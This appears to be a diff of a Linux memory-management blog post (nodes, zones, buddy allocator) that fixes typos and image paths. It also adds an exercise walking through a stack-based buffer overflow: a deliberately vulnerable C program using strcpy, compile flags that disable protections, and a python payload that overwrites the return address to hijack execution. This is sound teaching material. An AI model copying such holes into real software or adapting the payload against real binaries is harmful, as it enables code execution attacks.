@@ -38,7 +38,7 @@ tags: [linux, memory]
     - They are managed using list called "pgdat_list"
   - Linux can access the Physical Memory using consistent Node structure no matter what the system is.
     - "pg_data_t" structure is used.
-      - "node_present_pages": actual size of the phyiscal memory in the node
+      - "node_present_pages": actual size of the physical memory in the node
       - "node_start_pfn": the index number of the physical memory in the memory map
       - "node_zones": zone structure
       - "nr_zones": the number of zones
@@ -46,14 +46,14 @@ tags: [linux, memory]
       - Linux tends to allocate the nearest memory from the CPU working on the Task.
       - Linux tends to reallocate the CPU which have worked on the same task.
 
-    ![Bank-Node]({{ "//assets/img/post/2020-12-07/bank-node.png" | relative_url }})
+    ![Bank-Node]({{ "/assets/img/post/2020-12-07/bank-node.png" | relative_url }})
 
 - Zone
   - Some ISA BUS-based devices are necessary to allocate the region under 16MB of the physical memory.
   - Zones are several regions of the physical memory for the Node.
     - "/include/linux/mmzone.h"
   - The memory in the same zone has the same properties.
-  - The memory in the different zone should be managed seperately.
+  - The memory in the different zone should be managed separately.
 
   | Region    | Zone name              | Description
   | --------- | ---------------------- | -----------
@@ -68,7 +68,7 @@ tags: [linux, memory]
     - "watermark" and "vm_stat" determine appropriate memory freeing policy at memory shortage.
       - On the memory shortage, the processes failed to fetch memory are put into "wait_queue" with hashing on "wait_table" variable.
 
-  ```termainl
+  ```terminal
   $ cat /proc/zoneinfo
   Node 0, zone      DMA
     per-node stats
@@ -311,7 +311,7 @@ tags: [linux, memory]
   - Node may be composed of one or more Zones.
   - Zone may be composed of many Page frames.
 
-  ![Node-Zone]({{ "//assets/img/post/2020-12-07/node-zone.png" | relative_url }})
+  ![Node-Zone]({{ "/assets/img/post/2020-12-07/node-zone.png" | relative_url }})
 
 ## Buddy and Slab
 
@@ -327,25 +327,25 @@ tags: [linux, memory]
       - free_list
       - map
 
-      ![free_area]({{ "//assets/img/post/2020-12-07/free_area.png" | relative_url }})
+      ![free_area]({{ "/assets/img/post/2020-12-07/free_area.png" | relative_url }})
 
       - The number of free_area will be the number of squares of 2 which calculates the maximum number of page frames for one buddy. (e.g. 4KB, 8KB, 16KB, ..., 4MB)
   - Example
     - On 2 pages are requested
 
-      ![Buddy allocator procedure 1]({{ "//assets/img/post/2020-12-07/buddy-allocator1.png" | relative_url }})
+      ![Buddy allocator procedure 1]({{ "/assets/img/post/2020-12-07/buddy-allocator1.png" | relative_url }})
 
     - On another 2 pages are requested
 
-      ![Buddy allocator procedure 2]({{ "//assets/img/post/2020-12-07/buddy-allocator2.png" | relative_url }})
+      ![Buddy allocator procedure 2]({{ "/assets/img/post/2020-12-07/buddy-allocator2.png" | relative_url }})
 
     - On page 11 are freed
 
-      ![Buddy allocator procedure 3]({{ "//assets/img/post/2020-12-07/buddy-allocator3.png" | relative_url }})
+      ![Buddy allocator procedure 3]({{ "/assets/img/post/2020-12-07/buddy-allocator3.png" | relative_url }})
 
   - Lazy Buddy
 
-    ![Lazy Buddy]({{ "//assets/img/post/2020-12-07/lazy-buddy.png" | relative_url }})
+    ![Lazy Buddy]({{ "/assets/img/post/2020-12-07/lazy-buddy.png" | relative_url }})
 
     - "free_area::map" -> "free_area::nr_free": number of free Page frames
 
@@ -358,3 +358,77 @@ tags: [linux, memory]
 
 - Slab Allocator
   - Internal Fragmentation
+
+## [Exercise 2. Answer: Understanding Stack based buffer overflow](<https://payatu.com/blog/Siddharth-Bezalwar/understanding-stack-based-buffer-overflow>){:target="_blank"}
+
+```cpp
+#include <string.h>
+#include <stdio.h>
+
+void function2() {
+  printf(“Execution flow changed\n”);
+}
+
+void function1(char *str){
+  char buffer[5];
+  strcpy(buffer, str);  // break point 1.
+}                       // break point 2.
+
+void main(int argc, char *argv[])
+{
+  function1(argv[1]);   // break point 3.
+  printf(“Executed normally\n”);
+}
+```
+
+```terminal
+gcc -g -fno-stack-protector -z execstack -o bufferoverflow overflow.c
+```
+
+- -g tells GCC to add extra information for GDB
+- -fno-stack-protector flag to turn off stack protection mechanism
+- -z execstack, it makes stack executable.
+
+```terminal
+$ ./bufferoverflow AAAA
+Executed normally
+$ ./bufferoverflow AAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+```
+
+- break point 3.
+
+  ![break point 3.]({{ "/assets/img/post/2020-12-07/breakpoint3-1.png" | relative_url }})
+  
+- break point 1.
+
+  ![break point 1.]({{ "/assets/img/post/2020-12-07/breakpoint1.png" | relative_url }})
+
+- break point 2.
+
+  ![break point 2.]({{ "/assets/img/post/2020-12-07/breakpoint2.png" | relative_url }})
+
+- Return address, EBP and ESP on function stack frame
+
+  ![EBP and ESP on function stack frame]({{ "/assets/img/post/2020-12-07/esp_ebp_on_func_call_stack.png" | relative_url }})
+
+- break point 3.
+
+  When you overwrite the return address with As you will get segmentation fault with message 0x41414141 in ?? () in GDB. This means you successfully overwritten the return address.
+
+  ![break point 3.]({{ "/assets/img/post/2020-12-07/breakpoint3-2.png" | relative_url }})
+
+- Hijacking Execution
+  - Find the function2 address
+
+    ![function 2 address]({{ "/assets/img/post/2020-12-07/function2address.png" | relative_url }})
+
+  - Overwrite the Return address with the function 2 address
+
+    ![run with function 2 address]({{ "/assets/img/post/2020-12-07/run_function2address.png" | relative_url }})
+
+  ```terminal
+  $ ./bufferoverflow $(python -c 'print "A"*17 + "\x1b\x84\x04\x08"')
+  Execution flow changed
+  Segmentation fault
+  ```
